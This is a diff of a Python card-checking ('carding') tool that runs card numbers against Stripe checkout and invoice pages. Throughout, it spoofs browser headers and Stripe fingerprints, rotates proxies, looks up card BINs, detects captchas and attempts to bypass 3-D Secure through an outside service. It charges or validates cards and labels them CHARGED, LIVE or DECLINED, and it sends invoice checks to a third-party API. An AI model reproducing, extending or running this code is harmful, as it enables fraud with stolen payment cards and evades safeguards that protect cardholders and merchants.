@@ -54,12 +54,15 @@ def get_random_ua():
 
 def get_browser_headers(ref_url=None, origin=None):
     ua = get_random_ua()
+    
     chrome_versions = ["131.0.0.0", "130.0.0.0", "129.0.0.0", "128.0.0.0"]
     version = random.choice(chrome_versions)
     major = version.split(".")[0]
+    
     is_chrome = "Chrome" in ua and "Chromium" not in ua and "Firefox" not in ua
     is_firefox = "Firefox" in ua
     is_safari = "Safari" in ua and "Chrome" not in ua
+    
     headers = {
         "User-Agent": ua,
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
@@ -74,6 +77,7 @@ def get_browser_headers(ref_url=None, origin=None):
         "Sec-Fetch-User": "?1",
         "Cache-Control": "max-age=0",
     }
+    
     if is_chrome:
         headers["sec-ch-ua"] = f'"Chromium";v="{major}", "Not(A:Brand";v="8", "Google Chrome";v="{major}"'
         headers["sec-ch-ua-mobile"] = "?0"
@@ -84,20 +88,25 @@ def get_browser_headers(ref_url=None, origin=None):
         headers["sec-ch-ua"] = f'"Not_A Brand";v="8", "Chromium";v="{major}", "Google Chrome";v="{major}"'
         headers["sec-ch-ua-mobile"] = "?0"
         headers["sec-ch-ua-platform"] = f'"{random.choice(["macOS", "iOS"])}"'
+    
     if origin:
         headers["Origin"] = origin
     if ref_url:
         headers["Referer"] = ref_url
+    
     if random.random() > 0.5:
         headers["Viewport-Width"] = str(random.choice([1920, 1536, 1440, 1366, 1280]))
         headers["Width"] = headers["Viewport-Width"]
+    
     return headers
 
 def get_stripe_headers(pk=None, ref_url=None, origin=None):
     ua = get_random_ua()
+    
     chrome_versions = ["131.0.0.0", "130.0.0.0", "129.0.0.0", "128.0.0.0"]
     version = random.choice(chrome_versions)
     major = version.split(".")[0]
+    
     headers = {
         "User-Agent": ua,
         "Accept": "application/json",
@@ -117,12 +126,11 @@ def get_stripe_headers(pk=None, ref_url=None, origin=None):
         "sec-ch-ua-full-version": f'"{major}.0.0.0"',
         "sec-ch-ua-full-version-list": f'"Chromium";v="{major}.0.0.0", "Google Chrome";v="{major}.0.0.0", "Not(A:Brand";v="99.0.0.0"',
     }
+    
     if random.random() > 0.3:
         headers["Cache-Control"] = random.choice(["no-cache", "no-store", "max-age=0", "must-revalidate"])
+    
     return headers
-
-
-# ── Proxy management ──────────────────────────────────────────────────────────
 
 def load_proxies() -> dict:
     if os.path.exists(PROXY_FILE):
@@ -150,36 +158,15 @@ def add_user_proxy(user_id: int, proxy: str):
     user_key = str(user_id)
     if user_key not in proxies:
         proxies[user_key] = []
+    # Normalize string -> list
     if isinstance(proxies[user_key], str):
         proxies[user_key] = [proxies[user_key]] if proxies[user_key] else []
+
     if proxy:
         if proxy not in proxies[user_key]:
             proxies[user_key].append(proxy)
+
     save_proxies(proxies)
-
-def remove_user_proxy(user_id: int, proxy: str = None) -> bool:
-    proxies = load_proxies()
-    user_key = str(user_id)
-    if user_key in proxies:
-        if proxy is None or proxy.lower() == "all":
-            del proxies[user_key]
-        else:
-            if isinstance(proxies[user_key], list):
-                proxies[user_key] = [p for p in proxies[user_key] if p != proxy]
-                if not proxies[user_key]:
-                    del proxies[user_key]
-            elif isinstance(proxies[user_key], str) and proxies[user_key] == proxy:
-                del proxies[user_key]
-        save_proxies(proxies)
-        return True
-    return False
-
-def get_user_proxy(user_id: int) -> str:
-    user_proxies = get_user_proxies(user_id)
-    if user_proxies:
-        return random.choice(user_proxies)
-    return None
-
 
 async def check_proxy_alive(proxy_str: str, timeout: int = 10) -> dict:
     result = {
@@ -189,10 +176,12 @@ async def check_proxy_alive(proxy_str: str, timeout: int = 10) -> dict:
         "external_ip": None,
         "error": None
     }
+    
     proxy_url = get_proxy_url(proxy_str)
     if not proxy_url:
         result["error"] = "Invalid format"
         return result
+    
     try:
         start = time.perf_counter()
         async with aiohttp.ClientSession() as session:
@@ -211,95 +200,18 @@ async def check_proxy_alive(proxy_str: str, timeout: int = 10) -> dict:
         result["error"] = "Timeout"
     except Exception as e:
         result["error"] = str(e)[:30]
+    
     return result
 
 async def check_proxies_batch(proxies: list, max_threads: int = 10) -> list:
     semaphore = asyncio.Semaphore(max_threads)
+    
     async def check_with_semaphore(proxy):
         async with semaphore:
             return await check_proxy_alive(proxy)
+    
     tasks = [check_with_semaphore(p) for p in proxies]
     return await asyncio.gather(*tasks)
-
-
-# ── Email management ──────────────────────────────────────────────────────────
-
-def load_emails() -> dict:
-    if os.path.exists(EMAIL_FILE):
-        try:
-            with open(EMAIL_FILE, 'r') as f:
-                return json.load(f)
-        except:
-            return {}
-    return {}
-
-def save_emails(data: dict):
-    os.makedirs(os.path.dirname(EMAIL_FILE), exist_ok=True)
-    with open(EMAIL_FILE, 'w') as f:
-        json.dump(data, f, indent=2)
-
-def set_user_email(user_id: int, email: str):
-    emails = load_emails()
-    emails[str(user_id)] = email
-    save_emails(emails)
-
-def get_user_email(user_id: int) -> str:
-    emails = load_emails()
-    return emails.get(str(user_id), None)
-
-def remove_user_email(user_id: int) -> bool:
-    emails = load_emails()
-    if str(user_id) in emails:
-        del emails[str(user_id)]
-        save_emails(emails)
-        return True
-    return False
-
-
-# ── IP / proxy info helpers ───────────────────────────────────────────────────
-
-def obfuscate_ip(ip: str) -> str:
-    if not ip:
-        return "N/A"
-    parts = ip.split('.')
-    if len(parts) == 4:
-        return f"{parts[0][0]}XX.{parts[1][0]}XX.{parts[2][0]}XX.{parts[3][0]}XX"
-    return "N/A"
-
-async def get_proxy_info(proxy_str: str = None, timeout: int = 10) -> dict:
-    result = {
-        "status": "dead",
-        "ip": None,
-        "ip_obfuscated": None,
-        "country": None,
-        "city": None,
-        "org": None,
-        "using_proxy": False
-    }
-    proxy_url = None
-    if proxy_str:
-        proxy_url = get_proxy_url(proxy_str)
-        result["using_proxy"] = True
-    try:
-        async with aiohttp.ClientSession() as session:
-            kwargs = {"timeout": aiohttp.ClientTimeout(total=timeout)}
-            if proxy_url:
-                kwargs["proxy"] = proxy_url
-            async with session.get("http://ip-api.com/json", **kwargs) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    result["status"] = "alive"
-                    result["ip"] = data.get("query")
-                    result["ip_obfuscated"] = obfuscate_ip(data.get("query"))
-                    result["country"] = data.get("country")
-                    result["city"] = data.get("city")
-                    result["org"] = data.get("isp")
-    except:
-        result["status"] = "dead"
-    return result
-
-
-# ── Core Stripe constants / sessions ─────────────────────────────────────────
 
 HEADERS = {
     "accept": "application/json",
@@ -323,7 +235,7 @@ async def _lookup_bin_online(bin_code):
     bin_code = str(bin_code)[:6]
     if bin_code in _bin_cache:
         return _bin_cache[bin_code]
-
+    
     def _flag(cc):
         if cc and len(cc) == 2:
             return ''.join(chr(0x1F1E6 + ord(c) - ord('A')) for c in cc.upper())
@@ -343,6 +255,7 @@ async def _lookup_bin_online(bin_code):
                     return result
         except Exception:
             pass
+        
         try:
             async with s.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=aiohttp.ClientTimeout(total=4)) as resp:
                 if resp.status == 200:
@@ -355,6 +268,7 @@ async def _lookup_bin_online(bin_code):
                     return result
         except Exception:
             pass
+        
         try:
             async with s.get(f"https://lookup.binlist.net/{bin_code}", timeout=aiohttp.ClientTimeout(total=4)) as resp:
                 if resp.status == 200:
@@ -371,12 +285,13 @@ async def _lookup_bin_online(bin_code):
             pass
     except Exception:
         pass
+    
     return "UNKNOWN | UNKNOWN | "
-
 
 def parse_proxy_format(proxy_str: str) -> dict:
     proxy_str = proxy_str.strip()
     result = {"user": None, "password": None, "host": None, "port": None, "raw": proxy_str}
+    
     try:
         if '@' in proxy_str:
             if proxy_str.count('@') == 1:
@@ -398,6 +313,7 @@ def parse_proxy_format(proxy_str: str) -> dict:
                 result["port"] = int(parts[1])
     except:
         pass
+    
     return result
 
 def get_proxy_url(proxy_str: str) -> str:
@@ -484,6 +400,7 @@ def extract_checkout_url(text: str) -> str:
         if m:
             url = m.group(0).rstrip('.,;:')
             return url
+    # Fallback: any http URL in the text
     m = re.search(r'https?://[^\s\"\'\<\>]{10,}', text)
     if m:
         return m.group(0).rstrip('.,;:')
@@ -503,28 +420,37 @@ def detect_url_type(url: str) -> str:
 
 def decode_pk_from_url(url: str) -> dict:
     result = {"pk": None, "cs": None, "site": None, "stripe_account": None}
+    
     try:
         cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
         if cs_match:
             result["cs"] = cs_match.group(0)
+        
         if '#' not in url:
             return result
+        
         hash_part = url.split('#')[1]
         hash_decoded = unquote(hash_part)
+        
         try:
             decoded_bytes = base64.b64decode(hash_decoded)
             xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
+            
             pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
             if pk_match:
                 result["pk"] = pk_match.group(0)
+            
+            # Extract Stripe Connect account ID from decoded fragment
             acct_match = re.search(r'acct_[A-Za-z0-9]{8,}', xored)
             if acct_match:
                 result["stripe_account"] = acct_match.group(0)
+            
             site_match = re.search(r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', xored)
             if site_match:
                 full_site = site_match.group(0)
                 if "stripe.com" not in full_site.lower() and "checkout.stripe.com" not in full_site.lower():
                     result["site"] = full_site
+            
             if not result.get("site") or "stripe.com" in result.get("site", "").lower():
                 domains = re.findall(r'[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', xored)
                 for d in domains:
@@ -532,6 +458,7 @@ def decode_pk_from_url(url: str) -> dict:
                     if not any(x in d_lower for x in ["stripe.com", "checkout.stripe.com", "api.stripe.com", "js.stripe.com", "m.stripe.network"]):
                         result["site"] = d
                         break
+            
             if not result.get("site") or "stripe.com" in result.get("site", "").lower():
                 from urllib.parse import urlparse
                 all_urls = re.findall(r'https?://[^\s\"\'\<\>#]+', xored)
@@ -544,8 +471,10 @@ def decode_pk_from_url(url: str) -> dict:
                             break
         except:
             pass
+            
     except:
         pass
+    
     return result
 
 async def check_checkout_active(pk: str, cs: str, proxy_str: str = None) -> bool:
@@ -579,22 +508,28 @@ async def get_checkout_info(url: str, proxy_str: str = None) -> dict:
         "trial_amount": None, "after_trial_price": None, "setup_intent": None,
         "subscription_data": None, "stripe_account": None
     }
+    
     url = url.strip() if url else ""
     print(f"[CO] DEBUG: Processing URL: '{url}' (len: {len(url)})")
+    
     if not url or len(url) < 10:
         print("[CO] ERROR: URL too short or empty")
         result["error"] = "No checkout URL provided"
         result["time"] = round(time.perf_counter() - start, 2)
         return result
+            
     try:
         decoded = decode_pk_from_url(url)
         result["pk"] = decoded.get("pk")
         result["cs"] = decoded.get("cs")
         result["site"] = decoded.get("site")
+        # Capture Connect account ID if encoded in the URL fragment
         if decoded.get("stripe_account"):
             result["stripe_account"] = decoded["stripe_account"]
+        
         if result["cs"] and not result["pk"]:
             result["pk"] = await fetch_pk_from_checkout_page(result["cs"])
+        
         if result["pk"] and result["cs"]:
             proxy_url = get_proxy_url(proxy_str) if proxy_str else None
             s = await get_session()
@@ -617,6 +552,7 @@ async def get_checkout_info(url: str, proxy_str: str = None) -> dict:
                             init_data = None
                         else:
                             init_data = await r.json()
+
                     if init_data and "error" not in init_data:
                         result["init_data"] = init_data
                         acct_direct = init_data.get("stripe_account") or init_data.get("account")
@@ -638,6 +574,7 @@ async def get_checkout_info(url: str, proxy_str: str = None) -> dict:
                         result["error"] = f"Network Error ({str(e)[:30]})"
                     await asyncio.sleep(1)
 
+            # If we didn't obtain valid init_data and a proxy was provided, try alternate proxy schemes
             if not result.get("init_data") and proxy_str:
                 variants = build_proxy_variants(proxy_str)
                 for pv in variants:
@@ -658,6 +595,7 @@ async def get_checkout_info(url: str, proxy_str: str = None) -> dict:
                     except Exception:
                         continue
 
+            # Populate fields from init_data if we have it
             if result.get("init_data"):
                 init_data = result["init_data"]
                 acct_direct = init_data.get("stripe_account") or init_data.get("account")
@@ -767,7 +705,7 @@ async def get_checkout_info(url: str, proxy_str: str = None) -> dict:
                     result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
             else:
                 result["error"] = "Could not initialize checkout"
-
+        
         if not result["merchant"] or not result["price"] or not result["stripe_account"]:
             page_data = await fetch_checkout_page_data(url)
             if not result["merchant"] and page_data.get("merchant"):
@@ -780,13 +718,13 @@ async def get_checkout_info(url: str, proxy_str: str = None) -> dict:
                 result["pk"] = page_data["pk"]
             if not result["stripe_account"] and page_data.get("stripe_account"):
                 result["stripe_account"] = page_data["stripe_account"]
-
+        
         if result["stripe_account"]:
             print(f"[CO] Connect account: {result['stripe_account']}")
-
+            
     except Exception as e:
         result["error"] = str(e)
-
+    
     result["time"] = round(time.perf_counter() - start, 2)
     return result
 
@@ -796,24 +734,28 @@ def detect_captcha_challenge(conf: dict) -> tuple:
         err_type = err.get("type", "")
         err_code = err.get("code", "")
         err_msg = err.get("message", "").lower()
+        
         if err_type == "captcha" or err_code == "captcha_required" or "captcha" in err_code:
             captcha_data = err.get("captcha", {})
             sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
             captcha_type = captcha_data.get("type", "turnstile")
             print(f"[CO] CAPTCHA detected in error: type={captcha_type}, sitekey={sitekey[:20]}...")
             return True, sitekey, captcha_type
+        
         if "captcha" in err_msg or "verify you are human" in err_msg or "bot detection" in err_msg:
             captcha_data = err.get("captcha", {})
             sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
             captcha_type = captcha_data.get("type", "turnstile")
             print(f"[CO] CAPTCHA detected in message: type={captcha_type}")
             return True, sitekey, captcha_type
+    
     if conf.get("captcha") or conf.get("requires_captcha"):
         captcha_data = conf.get("captcha", {})
         sitekey = captcha_data.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
         captcha_type = captcha_data.get("type", "turnstile")
         print(f"[CO] CAPTCHA detected in response: type={captcha_type}")
         return True, sitekey, captcha_type
+    
     if conf.get("intent_confirmation_challenge"):
         challenge = conf.get("intent_confirmation_challenge", {})
         challenge_type = challenge.get("type", "")
@@ -821,12 +763,14 @@ def detect_captcha_challenge(conf: dict) -> tuple:
             sitekey = challenge.get("sitekey", STRIPE_TURNSTILE_SITEKEY)
             print(f"[CO] CAPTCHA detected in intent_confirmation_challenge: type={challenge_type}")
             return True, sitekey, challenge_type
+    
     if "sitekey" in str(conf).lower():
         match = re.search(r'0x4[A-Z0-9_-]{18,22}', str(conf))
         if match:
             sitekey = match.group(0)
             print(f"[CO] CAPTCHA sitekey extracted from response string: {sitekey}")
             return True, sitekey, "turnstile"
+    
     pi = conf.get("payment_intent", {})
     if isinstance(pi, dict):
         next_action = pi.get("next_action", {})
@@ -835,12 +779,15 @@ def detect_captcha_challenge(conf: dict) -> tuple:
         elif "captcha" in str(next_action).lower():
             print(f"[CO] CAPTCHA detected in payment_intent.next_action")
             return True, STRIPE_TURNSTILE_SITEKEY, "turnstile"
+    
     return False, "", ""
 
 def _generate_stripe_fingerprint() -> dict:
     """Generate Stripe.js-like browser fingerprint (guid/muid/sid)"""
     chars = "0123456789abcdefghijklmnopqrstuvwxyz"
+    
     stripe_js_version = random.choice(["7a7dd6d24d", "8f8f8d24d", "9a7dd6d24d", "6a7dd6d24d"])
+    
     return {
         "guid": "".join(random.choices(chars, k=32)),
         "muid": "".join(random.choices(chars, k=32)),
@@ -913,11 +860,14 @@ def _is_confirm_error_msg(conf: dict) -> bool:
 
 def _parse_confirm_response(conf: dict, checkout_data: dict, result: dict, start: float, init_data: dict, cs: str) -> dict:
     """Parse Stripe confirm response into a normalized result dict"""
+    # Handle last_payment_error (from PI response after 3DS bypass)
     if "last_payment_error" in conf:
         err = conf["last_payment_error"]
         dc = err.get("decline_code", "")
         raw = err.get("message", "Declined")
         err_code = err.get("code", "")
+
+        # Handle 3DS bypass failure - CC not supported
         if err_code == "payment_intent_authentication_failure":
             result["status"] = "DECLINED"
             result["response"] = "3DS BYPASS FAILED - CC NOT SUPPORTED"
@@ -926,24 +876,28 @@ def _parse_confirm_response(conf: dict, checkout_data: dict, result: dict, start
             result["code"] = "authentication_failed"
             result["time"] = round(time.perf_counter() - start, 2)
             return result
+
         if dc:
             resp = f"[{dc}] {_clean_stripe_response(raw)}"
         else:
             resp = _clean_stripe_response(raw)
+        
         result["status"] = "DECLINED"
         result["response"] = resp
         result["decline_code"] = dc or "N/A"
         result["code"] = err_code
         result["time"] = round(time.perf_counter() - start, 2)
         return result
-
+    
     if "error" in conf:
         err = conf["error"]
         dc = err.get("decline_code", "")
         raw = err.get("message", "Declined")
         err_code = err.get("code", "")
+
         if not dc and (err_code == "incorrect_cvc" or "security code" in raw.lower() or "incorrect_cvc" in err_code.lower()):
             dc = "incorrect_cvc"
+
         if "expired" in raw.lower() or "expired" in err_code.lower():
             result["status"] = "EXPIRED"
             result["response"] = "Session expired"
@@ -976,11 +930,13 @@ def _parse_confirm_response(conf: dict, checkout_data: dict, result: dict, start
         else:
             st = conf.get("status", "")
 
+        # Check last_payment_error FIRST (even if status is requires_payment_method)
         if isinstance(pi, dict) and "last_payment_error" in pi:
             err = pi["last_payment_error"]
             dc = err.get("decline_code", "")
             raw = err.get("message", "Declined")
             err_code = err.get("code", "")
+            
             if err_code == "payment_intent_authentication_failure":
                 result["status"] = "DECLINED"
                 result["response"] = f"[authentication_failed] {_clean_stripe_response(raw)}"
@@ -988,6 +944,7 @@ def _parse_confirm_response(conf: dict, checkout_data: dict, result: dict, start
                 result["decline_code"] = dc or "N/A"
                 result["time"] = round(time.perf_counter() - start, 2)
                 return result
+            
             if dc:
                 resp = f"[{dc}] {_clean_stripe_response(raw)}"
             else:
@@ -1088,8 +1045,6 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, cu
             result["response"] = "3D Secure Required"
             result["decline_code"] = "N/A"
             result["code"] = "requires_action"
-            result["pi_client_secret"] = tls_result.get("pi_client_secret", "")
-            result["pi_id"] = tls_result.get("pi_id", "")
             result["time"] = tls_result.get("time", round(time.perf_counter() - start, 2))
             return result
         elif tls_status == "DECLINED":
@@ -1196,6 +1151,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, cu
             if "error" in pm:
                 err_msg = pm["error"].get("message", "Card error")
                 low_err = err_msg.lower()
+
                 if ("integration surface" in low_err or "tokenization" in low_err
                         or "unsupported" in low_err or "elements" in low_err):
                     use_direct_confirm = True
@@ -1345,7 +1301,9 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, cu
                         result["time"] = round(time.perf_counter() - start, 2)
                         return result
 
+                # Attempt 3DS bypass via external bypass service if requested
                 try:
+                    # Normalize next_action lookup (search both top-level and payment_intent)
                     pi = conf.get("payment_intent") or {}
                     next_action = {}
                     if isinstance(pi, dict) and pi.get("next_action"):
@@ -1380,6 +1338,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, cu
                     if needs_3ds and bypass_3ds:
                         print(f"[CO] 3DS detected (type={na_type}) - attempting bypass, creq={'present' if creq else 'missing'}")
 
+                        # Find the 3DS2 source (payatt_... / tdsrc_... / src_...)
                         source = _find_in_obj(next_action, "three_d_secure_2_source") or _find_in_obj(next_action, "source")
                         if not source or not str(source).startswith(("payatt_", "tdsrc_", "src_")):
                             def _find_id(obj, prefix):
@@ -1401,6 +1360,7 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, cu
                                 if source:
                                     break
 
+                        # Find server transaction ID for browser fingerprintData
                         server_txn_id = (_find_in_obj(next_action, "server_transaction_id")
                                          or _find_in_obj(conf, "server_transaction_id"))
 
@@ -1477,27 +1437,33 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, cu
                                     conf["three_d_secure_2"] = bypass_resp
                                     result["secondary_response"] = f"3DS bypass used: {bypass_resp.get('id', 'dot_bypasser')}"
 
+                                    # After bypass success - just GET PI then GET payment_pages
                                     print("[CO] Checking PI after bypass...")
+                                    
                                     pi = conf.get("payment_intent", {})
                                     pi_id = pi.get("id") if isinstance(pi, dict) else None
                                     client_secret = pi.get("client_secret") if isinstance(pi, dict) else None
-
+                                    
                                     if pi_id and client_secret:
+                                        # GET PI
                                         pi_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
                                         async with s.get(pi_url, headers=base_headers, proxy=proxy_url) as pi_r:
                                             pi_resp = await pi_r.json()
                                         print(f"[CO] PI: {json.dumps(pi_resp)[:1500]}")
-
+                                        
+                                        # Check for authentication failure - retry with new PM
                                         pi_err = pi_resp.get("last_payment_error", {})
                                         if pi_err.get("code") == "payment_intent_authentication_failure":
                                             print("[CO] Auth failure after bypass - retrying with new PM...")
                                             old_pm_id = pi_err.get("payment_method", {}).get("id") if isinstance(pi_err.get("payment_method"), dict) else None
                                             if not old_pm_id:
+                                                # Extract PM ID from PI
                                                 pm_data = pi_resp.get("payment_method")
                                                 if isinstance(pm_data, dict):
                                                     old_pm_id = pm_data.get("id")
-
+                                            
                                             if old_pm_id:
+                                                # Create new PM and attempt confirm again
                                                 new_pm_body = (
                                                     f"type=card"
                                                     f"&card[number]={card['cc']}"
@@ -1510,119 +1476,118 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, cu
                                                 )
                                                 async with s.post("https://api.stripe.com/v1/payment_methods", headers=base_headers, data=new_pm_body, proxy=proxy_url) as pm_r:
                                                     new_pm = await pm_r.json()
-
+                                                
                                                 if new_pm.get("id"):
                                                     print(f"[CO] Created new PM: {new_pm['id']}")
+                                                    # Confirm PI with new PM
                                                     pi_id = pi_resp.get("id")
                                                     pi_secret = pi_resp.get("client_secret")
                                                     confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
                                                     confirm_body = f"payment_method={new_pm['id']}&client_secret={pi_secret}"
                                                     async with s.post(confirm_url, headers=base_headers, data=confirm_body, proxy=proxy_url) as confirm_r:
                                                         confirm_result = await confirm_r.json()
-
+                                                    
                                                     print(f"[CO] Retry confirm: {json.dumps(confirm_result)[:600]}")
-
+                                                    
+                                                    # Check retry result
                                                     retry_err = confirm_result.get("last_payment_error", {})
                                                     if confirm_result.get("status") == "succeeded":
                                                         result["status"] = "CHARGED"
                                                         result["response"] = f"Charged {checkout_data.get('currency', 'USD')} {checkout_data.get('price', '0')}"
                                                         result["code"] = "succeeded"
+                                                        result["decline_code"] = "N/A"
+                                                        result["receipt_url"] = confirm_result.get("receipt_url")
                                                         result["time"] = round(time.perf_counter() - start, 2)
                                                         return result
-                                                    elif retry_err.get("decline_code") == "incorrect_cvc":
-                                                        result["status"] = "LIVE"
-                                                        result["response"] = f"[incorrect_cvc] {_clean_stripe_response(retry_err.get('message', 'Incorrect CVC'))}"
-                                                        result["decline_code"] = "incorrect_cvc"
-                                                        result["time"] = round(time.perf_counter() - start, 2)
-                                                        return result
-                                                    elif retry_err:
-                                                        dc = retry_err.get("decline_code", "")
+                                                    elif retry_err.get("code") == "payment_intent_authentication_failure":
+                                                        # Still failed, use retry error
                                                         raw = retry_err.get("message", "Declined")
+                                                        err_code = retry_err.get("code", "")
+                                                        dc = retry_err.get("decline_code", "")
                                                         result["status"] = "DECLINED"
-                                                        result["response"] = f"[{dc}] {_clean_stripe_response(raw)}" if dc else _clean_stripe_response(raw)
+                                                        result["response"] = f"[{dc or 'authentication_failed'}] {_clean_stripe_response(raw)}"
+                                                        result["code"] = err_code
                                                         result["decline_code"] = dc or "N/A"
                                                         result["time"] = round(time.perf_counter() - start, 2)
                                                         return result
-
-                                        if pi_resp.get("status") == "succeeded":
-                                            result["status"] = "CHARGED"
-                                            result["response"] = f"Charged {checkout_data.get('currency', 'USD')} {checkout_data.get('price', '0')}"
-                                            result["code"] = "succeeded"
-                                            result["time"] = round(time.perf_counter() - start, 2)
-                                            return result
-                                        elif pi_resp.get("status") in ("requires_action", "requires_payment_method"):
-                                            pi_err2 = pi_resp.get("last_payment_error") or {}
-                                            dc2 = pi_err2.get("decline_code", "")
-                                            raw2 = pi_err2.get("message", "Authentication failed")
-                                            result["status"] = "DECLINED"
-                                            result["response"] = f"[{dc2}] {_clean_stripe_response(raw2)}" if dc2 else _clean_stripe_response(raw2)
-                                            result["decline_code"] = dc2 or "N/A"
-                                            result["time"] = round(time.perf_counter() - start, 2)
-                                            return result
+                                        
+                                        # Use PI response for parsing (has decline_code)
+                                        if "payment_intent" in pi_resp:
+                                            conf = pi_resp
+                                        else:
+                                            conf = {"payment_intent": pi_resp}
+                                        
+                                        # Also get PP for receipt_url if needed
+                                        pp_url = f"https://api.stripe.com/v1/payment_pages/{cs}?key={pk}&eid=NA"
+                                        async with s.get(pp_url, headers=base_headers, proxy=proxy_url) as pp_r:
+                                            pp_resp = await pp_r.json()
+                                        print(f"[CO] PP: {json.dumps(pp_resp)[:1500]}")
+                                        
+                                        # Save full response to log file for debugging
+                                        try:
+                                            import os
+                                            log_dir = "logs"
+                                            os.makedirs(log_dir, exist_ok=True)
+                                            from datetime import datetime
+                                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                                            card_last4 = card['cc'][-4:] if card.get('cc') else 'xxxx'
+                                            log_file = f"{log_dir}/capture_{timestamp}_{card_last4}.json"
+                                            log_data = {
+                                                "pi_response": pi_resp,
+                                                "pp_response": pp_resp,
+                                                "conf_response": conf,
+                                                "card_last4": card_last4,
+                                                "status": "DECLINED"
+                                            }
+                                            with open(log_file, 'w') as f:
+                                                json.dump(log_data, f, indent=2)
+                                            print(f"[CO] Full response saved to {log_file}")
+                                        except Exception as log_err:
+                                            print(f"[CO] Could not save log: {log_err}")
                                     else:
-                                        result["status"] = "CHARGED"
-                                        result["response"] = f"Charged {checkout_data.get('currency', 'USD')} {checkout_data.get('price', '0')}"
-                                        result["code"] = "succeeded"
-                                        result["time"] = round(time.perf_counter() - start, 2)
-                                        return result
+                                        print("[CO] No pi_id/client_secret found")
                                 else:
-                                    result["status"] = "DECLINED"
-                                    result["response"] = "3DS BYPASS FAILED - CC NOT SUPPORTED"
-                                    result["decline_code"] = "N/A"
-                                    result["code"] = "authentication_failed"
-                                    result["time"] = round(time.perf_counter() - start, 2)
-                                    return result
-                            except Exception as be:
-                                print(f"[CO] Bypass request error: {be}")
+                                    # Bypass failed - handle authentication failure
+                                    bypass_error = bypass_resp.get("error", {}) if isinstance(bypass_resp, dict) else {}
+                                    error_msg = bypass_error.get("message", "3DS Failed") if isinstance(bypass_error, dict) else str(bypass_resp.get("error", "3DS Failed"))
+                                    
+                                    # Check for authentication failure in response
+                                    if "authentication_failure" in str(bypass_resp).lower() or bypass_resp.get("state") == "failed":
+                                        print(f"[CO] 3DS Bypass Failed: {error_msg}")
+                                        # Add error to conf so parser can handle it
+                                        conf["error"] = {
+                                            "message": "3DS Authentication Failed - Card may be blocked or invalid",
+                                            "type": "card_error",
+                                            "code": "payment_intent_authentication_failure",
+                                            "decline_code": "authentication_failed"
+                                        }
+                                    else:
+                                        print(f"[CO] Bypass failed: {error_msg}")
+                            except Exception as e:
+                                print(f"[CO] Bypass attempt error: {str(e)[:120]} - Retrying...")
+                                await asyncio.sleep(2)
+                                if attempt < max_retries:
+                                    continue
+                except Exception:
+                    pass
 
-                    if needs_3ds and not bypass_3ds:
-                        result["status"] = "3DS_REQUIRED"
-                        result["response"] = "3D Secure Required"
-                        result["decline_code"] = "N/A"
-                        result["code"] = "requires_action"
-                        pi_inner = conf.get("payment_intent") or {}
-                        if isinstance(pi_inner, dict):
-                            result["pi_client_secret"] = pi_inner.get("client_secret", "")
-                            result["pi_id"] = pi_inner.get("id", "")
-                        result["time"] = round(time.perf_counter() - start, 2)
-                        return result
+                return _parse_confirm_response(conf, checkout_data, result, start, init_data, cs)
 
-                except Exception as na_err:
-                    print(f"[CO] next_action parse error: {na_err}")
-
-                result = _parse_confirm_response(conf, checkout_data, result, start, init_data, cs)
-                return result
-
-        except aiohttp.ClientError as e:
-            err_str = str(e)
-            if attempt < max_retries:
-                print(f"[CO] Network error attempt {attempt+1}: {err_str[:50]}... retrying")
-                await asyncio.sleep(2 ** attempt)
-                continue
-            result["status"] = "ERROR"
-            result["response"] = f"Network error: {err_str[:60]}"
-            result["time"] = round(time.perf_counter() - start, 2)
-            return result
         except Exception as e:
             err_str = str(e)
-            if attempt < max_retries:
-                print(f"[CO] Error attempt {attempt+1}: {err_str[:50]}... retrying")
+            if attempt < max_retries and ("disconnect" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower()):
                 await asyncio.sleep(1)
                 continue
             result["status"] = "ERROR"
-            result["response"] = f"Error: {err_str[:60]}"
+            result["response"] = err_str[:50]
             result["time"] = round(time.perf_counter() - start, 2)
             return result
 
-    result["status"] = "ERROR"
-    result["response"] = "Max retries exceeded"
-    result["time"] = round(time.perf_counter() - start, 2)
     return result
 
-
-async def check_single_card(checkout_url: str, card: dict, proxy_str: str = None, use_browser_fallback: bool = False) -> dict:
+async def check_single_card(checkout_url: str, card: dict, proxy_str: str = None, use_browser_fallback: bool = False, bypass_3ds: bool = False) -> dict:
     start_time = time.perf_counter()
-
+    
     async def _do_check():
         if "invoice.stripe.com/i/" in checkout_url:
             payload = {
@@ -1631,32 +1596,33 @@ async def check_single_card(checkout_url: str, card: dict, proxy_str: str = None
                 "invoice_url": checkout_url
             }
             try:
-                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as s:
-                    async with s.post("https://api.barryxapi.xyz/stripe_invoice", json=payload, headers={"Content-Type": "application/json"}) as res:
-                        data = await res.json()
-                        api_result = data.get("result", {}) if isinstance(data.get("result"), dict) else data
-                        raw_status = api_result.get("status", data.get("status", data.get("response", "DECLINED")))
-                        status = str(raw_status).upper()
-                        message = "Unknown Response"
-                        message_sources = [api_result, data]
